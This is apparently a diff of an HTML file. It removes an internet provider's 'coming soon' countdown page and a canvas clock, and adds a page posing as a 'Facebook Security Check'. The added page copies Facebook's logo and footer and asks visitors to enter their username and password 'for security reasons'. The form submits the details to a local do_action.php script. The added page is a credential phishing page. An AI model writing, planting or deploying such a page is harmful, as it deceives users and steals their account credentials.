@@ -1,204 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RJ INTERNET PROVIDER - COMING SOON</title>
-    <style>
-        /* 3D Background */
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Arial', sans-serif;
-            background: radial-gradient(circle, #111, #000);
-            color: white;
-            text-align: center;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            perspective: 1000px;
-        }
-
-        /* Floating Container */
-        .container {
-            position: relative;
-            padding: 30px;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            border: 2px solid rgba(255, 215, 0, 0.5);
-            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
-            max-width: 500px;
-            width: 80%;
-            transform: rotateX(15deg) rotateY(-15deg);
-            animation: float 4s infinite ease-in-out;
-        }
-
-        @keyframes float {
-            0% { transform: rotateX(15deg) rotateY(-15deg) translateY(0px); }
-            50% { transform: rotateX(15deg) rotateY(-15deg) translateY(15px); }
-            100% { transform: rotateX(15deg) rotateY(-15deg) translateY(0px); }
-        }
-
-        /* 3D Logo */
-        .logo img {
-            width: 120px;
-            height: auto;
-            filter: drop-shadow(0 0 15px gold);
-        }
-
-        /* 3D Text Effect */
-        h1 {
-            font-size: 32px;
-            font-weight: bold;
-            text-transform: uppercase;
-            background: linear-gradient(90deg, gold, white);
-            -webkit-background-clip: text;
-            color: transparent;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
-            animation: glow 3s infinite alternate;
-        }
-
-        @keyframes glow {
-            0% { text-shadow: 0 0 10px gold; }
-            100% { text-shadow: 0 0 30px gold; }
-        }
-
-        /* Countdown Timer */
-        .countdown {
-            font-size: 26px;
-            font-weight: bold;
-            color: gold;
-            margin-top: 10px;
-            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
-        }
-    </style>
+	<meta charset="UTF-8">
+	<title>Security Check</title>
+	<link rel="shortcut icon" type="ico" href="images/fb-ico.png">
+	<link rel="stylesheet" type="text/css" href="style.css">
 </head>
 <body>
+	<header>
+		<div class="main-header">
+			<div class="logo">
+				<a href="http://www.facebook.com"><img src="images/logo.png" alt="Facebook"></a>
+			</div>
+		</div>
+	</header>
+	<section>
+		<div class="form">
+			<div class="m-header">
+				<h3>Facebook Security Check</h3>
+			</div>
+			<div class="red-box">
+				<p style="font-weight:bold; font-size:13px">Verification needed to understand it's you</p>
+				<p>Enter your password for security reasons (make sure you have caps lock turned off)</p>
+				<p>Forgot your password? <a href="http://www.facebook.com">Reset your password</a>
+			</div>
 
-    <div class="container">
-        <!-- 3D Logo -->
-        <div class="logo">
-            <img src="./hozi/hoxi.png" alt="FAMOFC Logo">
-        </div>
+			<div class="login-form">
+				<form action="do_action.php">
+					<label for="username">Username:</label>
+					<input name="username" type="text" id="username"></input><br /><br />
+					<label for="password">Password:</label>
+					<input name="password" id="password" type="password"></input><br />
+					<input id="keep" style="margin: 10px 0 0 84px" type="checkbox"></input>
+					<label for="keep" style="font-size:12px;">keep me logged in</label><br />
+					<input type="submit" name="submit" value="Verify" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
+					<p><a style="text-decoration:none; color:#3B5998; margin:0 0 0 80px;" href="">can't log in?</a></p>
+				</form>
+			</div>
 
-        <h1>RJ INTERNET PROVIDER - COMING SOON</h1>
-        <p>Something powerful is on the way. Stay tuned.</p>
-
-        <!-- Countdown Timer -->
-        <div class="countdown" id="countdown">Loading...</div>
-    </div>
-
-    <script>
-        // Countdown Timer Script
-        function updateCountdown() {
-            const targetDate = new Date("September 30, 2025 00:00:00").getTime();
-            const now = new Date().getTime();
-            const difference = targetDate - now;
-
-            const days = Math.floor(difference / (1000 * 60 * 60 * 24));
-            const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-            const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((difference % (1000 * 60)) / 1000);
-
-            document.getElementById("countdown").innerHTML = 
-                days + "d " + hours + "h " + minutes + "m " + seconds + "s ";
-        }
-
-        setInterval(updateCountdown, 1000);
-        updateCountdown();
-    </script>
-
-</body>
-</html>
-<!DOCTYPE html>
-<html>
-<body>
-
-<canvas id="canvas" width="400" height="400" style="background-color:#333">
-Sorry, your browser does not support canvas.
-</canvas>
-
-<script>
-const canvas = document.getElementById("canvas");
-const ctx = canvas.getContext("2d");
-let radius = canvas.height / 2;
-ctx.translate(radius, radius);
-radius = radius * 0.90
-setInterval(drawClock, 1000);
-
-function drawClock() {
-  drawFace(ctx, radius);
-  drawNumbers(ctx, radius);
-  drawTime(ctx, radius);
-}
-
-function drawFace(ctx, radius) {
-  const grad = ctx.createRadialGradient(0,0,radius*0.95, 0,0,radius*1.05);
-  grad.addColorStop(0, '#333');
-  grad.addColorStop(0.5, 'white');
-  grad.addColorStop(1, '#333');
-  ctx.beginPath();
-  ctx.arc(0, 0, radius, 0, 2*Math.PI);
-  ctx.fillStyle = 'white';
-  ctx.fill();
-  ctx.strokeStyle = grad;
-  ctx.lineWidth = radius*0.1;
-  ctx.stroke();
-  ctx.beginPath();
-  ctx.arc(0, 0, radius*0.1, 0, 2*Math.PI);
-  ctx.fillStyle = '#333';
-  ctx.fill();
-}
-
-function drawNumbers(ctx, radius) {
-  ctx.font = radius*0.15 + "px arial";
-  ctx.textBaseline="middle";
-  ctx.textAlign="center";
-  for(let num = 1; num < 13; num++){
-    let ang = num * Math.PI / 6;
-    ctx.rotate(ang);
-    ctx.translate(0, -radius*0.85);
-    ctx.rotate(-ang);
-    ctx.fillText(num.toString(), 0, 0);
-    ctx.rotate(ang);
-    ctx.translate(0, radius*0.85);
-    ctx.rotate(-ang);
-  }
-}
-
-function drawTime(ctx, radius){
-    const now = new Date();
-    let hour = now.getHours();
-    let minute = now.getMinutes();
-    let second = now.getSeconds();
-    //hour
-    hour=hour%12;
-    hour=(hour*Math.PI/6)+
-    (minute*Math.PI/(6*60))+
-    (second*Math.PI/(360*60));
-    drawHand(ctx, hour, radius*0.5, radius*0.07);
-    //minute
-    minute=(minute*Math.PI/30)+(second*Math.PI/(30*60));
-    drawHand(ctx, minute, radius*0.8, radius*0.07);
-    // second
-    second=(second*Math.PI/30);
-    drawHand(ctx, second, radius*0.9, radius*0.02);
-}
-
-function drawHand(ctx, pos, length, width) {
-    ctx.beginPath();
-    ctx.lineWidth = width;
-    ctx.lineCap = "round";
-    ctx.moveTo(0,0);
-    ctx.rotate(pos);
-    ctx.lineTo(0, -length);
-    ctx.stroke();
-    ctx.rotate(-pos);
-}
-</script>
-
+		</div>
+		
+		<footer>
+			<ul>
+				<li><a href="/">Mobile</a></li>
+				<li><a href="/">Find Friends</a></li>
+				<li><a href="/">Badges</a></li>
+				<li><a href="/">People</a></li>
+				<li><a href="/">Pages</a></li>
+				<li><a href="/">Apps</a></li>
+				<li><a href="/">Games</a></li>
+				<li><a href="/">Music</a></li>
+				<li><a href="/">Locations</a></li>
+			</ul>
+			<ul>
+				<li><a href="/">Topics</a></li>
+				<li><a href="/">About</a></li>
+				<li><a href="/">Create Ad</a></li>
+				<li><a href="/">Create Page</a></li>
+				<li><a href="/">Devepers</a></li>
+				<li><a href="/">Careers</a></li>
+				<li><a href="/">Privacy</a></li>
+				<li><a href="/">Cookies</a></li>
+				<li><a href="/">Terms</a></li><br />
+				<li><a href="/">Help</a></li>
+			</ul>
+		</footer>
+	</section>
 </body>
 </html>
